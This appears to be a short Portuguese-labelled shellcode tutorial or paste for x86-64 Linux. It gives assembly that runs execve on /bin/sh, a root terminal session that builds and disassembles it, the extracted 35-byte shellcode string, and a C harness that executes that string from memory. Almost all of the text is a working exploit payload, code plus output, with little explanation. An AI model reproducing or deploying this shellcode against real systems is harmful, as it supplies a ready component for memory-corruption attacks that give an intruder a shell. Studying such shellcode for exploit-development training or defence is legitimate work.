movabsq $0x68732f6e69622f20, %rax #// " /bin/sh"  
	shr $8,%rax	
	pushq %rax		
	movq %rsp, %rdi	        
	xorq %rax,%rax		#// %rax <- 0
	pushq %rax
	pushq %rdi
	movq %rsp, %rsi		#// %rsi <- argv (singleton array containing "/bin/sh")
	movq %rax, %rdx		#// %rdi <- envp (empty)
	addq $0x3b, %rax	#// %rax <- __NR_execve
	syscall
====================== Compilando e executando =========================
root@ChmoSec:~/Desktop/linux# cat shell.s 
	movabsq $0x68732f6e69622f20, %rax #// " /bin/sh"
	shr $8,%rax	
	pushq %rax		
	movq %rsp, %rdi	        
	xorq %rax,%rax		#// %rax <- 0
	pushq %rax
	pushq %rdi
	movq %rsp, %rsi		#// %rsi <- argv (singleton array containing "/bin/sh")
	movq %rax, %rdx		#// %rdi <- envp (empty)
	addq $0x3b, %rax	#// %rax <- __NR_execve
	syscall

root@ChmoSec:~/Desktop/linux# gcc -c shell.s
root@ChmoSec:~/Desktop/linux# ld shell.o
ld: warning: cannot find entry symbol _start; defaulting to 0000000000400078
root@ChmoSec:~/Desktop/linux# ls
a.out  msg.o  msg.s  shellcode.sh  shell.o  shell.s
root@ChmoSec:~/Desktop/linux# ./a.out 
# exit  
root@ChmoSec:~/Desktop/linux# objdump -d a.out 

a.out:     file format elf64-x86-64


Disassembly of section .text:

0000000000400078 <.text>:
  400078:	48 b8 20 2f 62 69 6e 	movabs $0x68732f6e69622f20,%rax
  40007f:	2f 73 68 
  400082:	48 c1 e8 08          	shr    $0x8,%rax
  400086:	50                   	push   %rax
  400087:	48 89 e7             	mov    %rsp,%rdi
  40008a:	48 31 c0             	xor    %rax,%rax
  40008d:	50                   	push   %rax
  40008e:	57                   	push   %rdi
  40008f:	48 89 e6             	mov    %rsp,%rsi
  400092:	48 89 c2             	mov    %rax,%rdx
  400095:	48 83 c0 3b          	add    $0x3b,%rax
  400099:	0f 05                	syscall 
root@ChmoSec:~/Desktop/linux# ./shellcode.sh a.out 
"\x48\xb8\x20\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xe8\x08\x50\x48\x89\xe7\x48\x31\xc0\x50\x57\x48\x89\xe6\x48\x89\xc2\x48\x83\xc0\x3b\x0f\x05"
len:  35
root@ChmoSec:~/Desktop/linux# 
========================= Injetando na memoria ==============================
# shell /bin/sh linux 644 bit 
#include 
#include 
 
char *shellcode = "\x48\xb8\x20\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xe8\x08\x50\x48\x89\xe7\x48\x31\xc0\x50\x57\x48\x89\xe6\x48\x89\xc2\x48\x83\xc0\x3b\x0f\x05";

int main(void)
{
fprintf(stdout,"Length: %d\n",strlen(shellcode));
(*(void(*)()) shellcode)();
return 0;
}
